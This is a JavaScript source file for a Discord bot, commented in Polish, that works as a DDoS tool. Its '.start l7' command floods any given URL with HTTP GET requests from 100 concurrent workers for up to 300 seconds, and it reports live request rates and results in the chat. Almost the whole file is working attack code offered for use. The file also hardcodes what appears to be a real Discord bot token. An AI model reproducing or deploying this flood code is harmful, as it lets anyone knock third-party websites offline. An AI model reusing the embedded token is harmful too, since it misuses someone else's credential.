const { Client, GatewayIntentBits, EmbedBuilder } = require('discord.js');
const http = require('http');
const https = require('https');
const { URL } = require('url');

// ===== KONFIGURACJA =====
const BOT_TOKEN = 'MTQ3NjAwMzcwODEwNTEzNDExMA.G2OIul.3fVojuSqE55cRm4ymZa81031nr_TZDIrxHUBPo';
const PREFIX = '.';
// ========================

const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent,
    ],
});

// Aktywne ataki (channelId -> dane)
const activeAttacks = new Map();

// ─── Wysyła jeden request ──────────────────────────────────────────────────────
function sendRequest(targetUrl) {
    return new Promise((resolve) => {
        try {
            const parsed = new URL(targetUrl);
            const isHttps = parsed.protocol === 'https:';
            const lib = isHttps ? https : http;

            const options = {
                hostname: parsed.hostname,
                port: parsed.port || (isHttps ? 443 : 80),
                path: parsed.pathname + parsed.search,
                method: 'GET',
                timeout: 5000,
                headers: {
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                    'Accept': 'text/html,application/xhtml+xml,*/*',
                    'Accept-Language': 'pl-PL,pl;q=0.9,en-US;q=0.8',
                    'Connection': 'keep-alive',
                    'Cache-Control': 'no-cache',
                },
            };

            const req = lib.request(options, (res) => {
                res.resume();
                resolve({ ok: true, code: res.statusCode });
            });

            req.on('error', () => resolve({ ok: false }));
            req.on('timeout', () => { req.destroy(); resolve({ ok: false }); });
            req.end();
        } catch {
            resolve({ ok: false });
        }
    });
}

// ─── Flood loop — wypełnia pulę workerów ──────────────────────────────────────
async function floodLoop(state) {
    const CONCURRENCY = 100; // równoległe requesty

    const worker = async () => {
        while (state.running) {
            const result = await sendRequest(state.url);
            state.total++;
            if (result.ok) {
                state.success++;
                state.codes[result.code] = (state.codes[result.code] || 0) + 1;
            } else {
                state.failed++;
            }
        }
    };

    // Uruchamiamy CONCURRENCY workerów naraz
    const workers = [];
    for (let i = 0; i < CONCURRENCY; i++) {
        workers.push(worker());
    }

    await Promise.all(workers);
}

// ─── Formatuje liczby ─────────────────────────────────────────────────────────
function fmt(n) {
    return n.toLocaleString('pl-PL');
}

// ─── Komenda .start l7 ────────────────────────────────────────────────────────
client.on('messageCreate', async (message) => {
    if (message.author.bot) return;
    if (!message.content.startsWith(PREFIX)) return;

    const args = message.content.slice(PREFIX.length).trim().split(/\s+/);
    const command = args[0]?.toLowerCase();

    if (command === 'start' && args[1]?.toLowerCase() === 'l7') {
        const url = args[2];
        const seconds = parseInt(args[3]);

        if (!url || !seconds || isNaN(seconds) || seconds < 1 || seconds > 300) {
            return message.reply('❌ Użycie: `.start l7 <url> <sekundy (1-300)>`');
        }

        try { new URL(url); } catch {
            return message.reply('❌ Nieprawidłowy URL.');
        }

        if (activeAttacks.has(message.channelId)) {
            return message.reply('⚠️ Atak już trwa na tym kanale!');
        }

        const state = {
            url,
            running: true,
            total: 0,
            success: 0,
            failed: 0,
            codes: {},
            startAt: Date.now(),
        };

        activeAttacks.set(message.channelId, state);

        // Embed startowy
        const startEmbed = new EmbedBuilder()
            .setTitle('🚀 L7 Flood — START')
            .setColor(0xFFA500)
            .addFields(
                { name: '🎯 Cel', value: `\`${url}\``, inline: false },
                { name: '⏱️ Czas', value: `\`${seconds}s\``, inline: true },
                { name: '⚡ Workers', value: '`100`', inline: true },
            )
            .setFooter({ text: 'Wyniki pojawią się po zakończeniu' })
            .setTimestamp();

        await message.reply({ embeds: [startEmbed] });

        // Live counter — aktualizuje się co 3s
        const statusMsg = await message.channel.send('📊 `Trwa atak... 0 req`');
        const liveInterval = setInterval(async () => {
            const elapsed = ((Date.now() - state.startAt) / 1000).toFixed(1);
            const rps = (state.total / Math.max(elapsed, 0.1)).toFixed(0);
            try {
                await statusMsg.edit(`📊 \`Trwa atak... ${fmt(state.total)} req | ${fmt(rps)} req/s | ${elapsed}s\``);
            } catch { }
        }, 3000);

        // Odpalamy flood
        floodLoop(state);

        // Zatrzymujemy po X sekundach
        setTimeout(async () => {
            state.running = false;
            clearInterval(liveInterval);

            const elapsed = (Date.now() - state.startAt) / 1000;
            const rps = (state.total / elapsed).toFixed(2);
            const pct = state.total > 0 ? ((state.success / state.total) * 100).toFixed(1) : '0';

            const codesStr = Object.entries(state.codes)
                .sort((a, b) => b[1] - a[1])
                .map(([code, n]) => `HTTP ${code}: **${fmt(n)}**`)
                .join('\n') || 'brak';

            const resultEmbed = new EmbedBuilder()
                .setTitle('✅ L7 Flood — WYNIKI')
                .setColor(0x57F287)
                .addFields(
                    { name: '🎯 Cel', value: `\`${url}\``, inline: false },
                    { name: '📦 Łącznie requestów', value: `\`${fmt(state.total)}\``, inline: true },
                    { name: '✅ Udane', value: `\`${fmt(state.success)}\``, inline: true },
                    { name: '❌ Błędy', value: `\`${fmt(state.failed)}\``, inline: true },
                    { name: '⚡ Śr. req/s', value: `\`${rps}\``, inline: true },
                    { name: '📈 Success rate', value: `\`${pct}%\``, inline: true },
                    { name: '⏱️ Czas ataku', value: `\`${elapsed.toFixed(2)}s\``, inline: true },
                    { name: '📊 Kody HTTP', value: codesStr, inline: false },
                )
                .setFooter({ text: 'L7 Flood zakończony' })
                .setTimestamp();

            try { await statusMsg.delete(); } catch { }
            await message.channel.send({ embeds: [resultEmbed] });
            activeAttacks.delete(message.channelId);
        }, seconds * 1000);
    }

    // .stop — zatrzymuje aktywny atak
    if (command === 'stop') {
        const state = activeAttacks.get(message.channelId);
        if (!state) return message.reply('⚠️ Brak aktywnego ataku.');
        state.running = false;
        activeAttacks.delete(message.channelId);
        message.reply('🛑 Atak zatrzymany.');
    }
});

client.once('ready', () => {
    console.log(`✅ Bot zalogowany jako ${client.user.tag}`);
});

client.login(BOT_TOKEN);


